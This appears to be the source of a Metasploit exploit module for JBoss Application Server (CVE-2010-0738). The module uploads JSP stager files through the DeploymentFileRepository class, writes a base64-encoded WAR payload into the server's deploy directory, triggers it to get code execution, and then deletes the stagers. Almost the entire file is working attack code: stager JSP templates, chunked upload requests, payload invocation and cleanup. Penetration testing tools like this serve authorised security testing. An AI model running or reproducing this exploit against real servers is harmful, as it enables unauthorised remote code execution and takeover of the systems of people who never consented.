##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }

  include Msf::HTTP::JBoss

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'JBoss Java Class DeploymentFileRepository WAR Deployment',
      'Description' => %q{
          This module uses the DeploymentFileRepository class in
        JBoss Application Server (jbossas) to deploy a JSP file
        which then deploys the WAR file.
      },
      'Author'      => [ 'MC', 'Jacob Giannantonio', 'Patrick Hof', 'h0ng10' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2010-0738' ], # by using VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
        ],
      'Privileged'  => false,
      'Platform'    => %w{ java linux win },
      'Targets'     =>
        [
          #
          # do target detection but java meter by default
          # detect via /manager/serverinfo
          #
          [ 'Automatic (Java based)',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'java',
            } ],

          #
          # Platform specific targets only
          #
          [ 'Windows Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            },
          ],
          [ 'Linux Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            },
          ],

          #
          # Java version
          #
          [ 'Java Universal',
            {
              'Platform' => 'java',
              'Arch' => ARCH_JAVA,
            }
          ]
        ],

      'DisclosureDate' => "Apr 26 2010",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('JSP',   [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
        OptString.new('APPBASE', [ false, 'Application base name, (default: random)', nil ])
      ], self.class)
  end

  def exploit
    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))
    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))
    stager_base = rand_text_alpha(8+rand(8))
    head_stager_jsp = rand_text_alpha(8+rand(8))
    stager_jsp  = rand_text_alpha(8+rand(8))
    content_var = rand_text_alpha(8+rand(8))
    decoded_var = rand_text_alpha(8+rand(8))
    file_path_var = rand_text_alpha(8+rand(8))
    jboss_home_var = rand_text_alpha(8+rand(8))
    fos_var = rand_text_alpha(8+rand(8))
    bw_var = rand_text_alpha(8+rand(8))

    p = payload
    mytarget = target

    if (datastore['VERB'] == 'HEAD')
      print_status("Unable to automatically select a target with HEAD requests")
    else
      if (target.name =~ /Automatic/)
        mytarget = auto_target()
        if (not mytarget)
          fail_with(Failure::NoTarget, "Unable to automatically select a target")
        end
        print_status("Automatically selected target \"#{mytarget.name}\"")
      else
        print_status("Using manually select target \"#{mytarget.name}\"")
      end
      arch = mytarget.arch
    end


    # set arch/platform from the target
    plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]

    # We must regenerate the payload in case our auto-magic changed something.
    return if ((p = exploit_regenerate_payload(plat, arch)) == nil)

    # Generate the WAR containing the payload
    war_data = p.encoded_war({
      :app_name => app_base,
      :jsp_name => jsp_name,
      :arch => mytarget.arch,
      :platform => mytarget.platform
    }).to_s

    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')

    # The following jsp script will write the stager  to the
    # deploy/management directory. It is only used with HEAD/GET requests
    # to overcome the size limit in those requests
    head_stager_jsp_code = <<-EOT
<%@page import="java.io.*,
  java.util.*"
%>

<%

  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{stager_base}.war/" + "#{stager_jsp}" + ".jsp";


  if (request.getParameter("#{content_var}") != null) {

      try {
        String #{content_var} = "";
        #{content_var} = request.getParameter("#{content_var}");
        FileWriter #{fos_var} = new FileWriter(#{file_path_var}, true);
        BufferedWriter #{bw_var} = new BufferedWriter(#{fos_var});
        #{bw_var}.write(#{content_var});
        #{bw_var}.close();
      }
      catch(Exception e)
      {
      }
  }
%>

EOT

    # The following jsp script will write the exploded WAR file to the deploy/
    # directory or try to delete it
    stager_jsp_code = <<-EOT
<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>

<%

  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{app_base}.war";


  try {
    String #{content_var} = "#{encoded_payload}";
    byte[] #{decoded_var} = new BASE64Decoder().decodeBuffer(#{content_var});
    FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
    #{fos_var}.write(#{decoded_var});
    #{fos_var}.close();
  }
  catch(Exception e)
  {
  }
%>

EOT

    # Depending on the type on the verb we might use a second stager
    if datastore['VERB'] == "POST" then
      print_status("Deploying stager for the WAR file")
      res = upload_file(stager_base, stager_jsp, stager_jsp_code)
    else
      print_status("Deploying minimal stager to upload the payload")
      res = upload_file(stager_base, head_stager_jsp, head_stager_jsp_code)
      head_stager_uri = "/" + stager_base + "/" + head_stager_jsp + ".jsp?"

      # We split the stager_jsp_code in multipe junks and transfer on the
      # target with multiple requests
      current_pos = 0
      while current_pos < stager_jsp_code.length
        next_pos = current_pos + 5000 + rand(100)
        junk = "#{content_var}=" + Rex::Text.uri_encode(stager_jsp_code[current_pos,next_pos])
        print_status("Uploading second stager (#{current_pos}/#{stager_jsp_code.length})")
        res = deploy('uri' => head_stager_uri + junk)
        current_pos += next_pos
      end
    end


    # Call the stager to deploy the payload war file
    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
    # but the file still gets written.
    if (res.code == 200 || res.code == 500)
      print_status("Calling stager to deploy the payload warfile (might take some time)")
      stager_uri = '/' + stager_base + '/' + stager_jsp + '.jsp'
      stager_res = deploy('uri' => stager_uri)

      print_status("Try to call the deployed payload")
      # Try to execute the payload by calling the deployed WAR file
      payload_uri = "/" + app_base + "/" + jsp_name + '.jsp'
      payload_res = deploy('uri' => payload_uri)

      #
      # DELETE
      #
      # The WAR can only be removed by physically deleting it, otherwise it
      # will get redeployed after a server restart.
      print_status("Undeploying stager and payload WARs via DeploymentFileRepository.remove()...")
      print_status("This might take some time, be patient...") if datastore['VERB'] == "HEAD"
      delete_res = []
      delete_res << delete_file(Rex::Text.uri_encode(stager_base) + '.war', stager_jsp, '.jsp')
      delete_res << delete_file(Rex::Text.uri_encode(stager_base) + '.war', head_stager_jsp, '.jsp')
      delete_res << delete_file('./', Rex::Text.uri_encode(stager_base) + '.war', '')
      delete_res << delete_file('./', Rex::Text.uri_encode(app_base) + '.war', '')
      delete_res.each do |res|
        if !res
          print_warning("WARNING: Unable to remove WAR [No Response]")
        elsif (res.code < 200 || res.code >= 300)
          print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
        end
      end

      handler
    end
  end


end
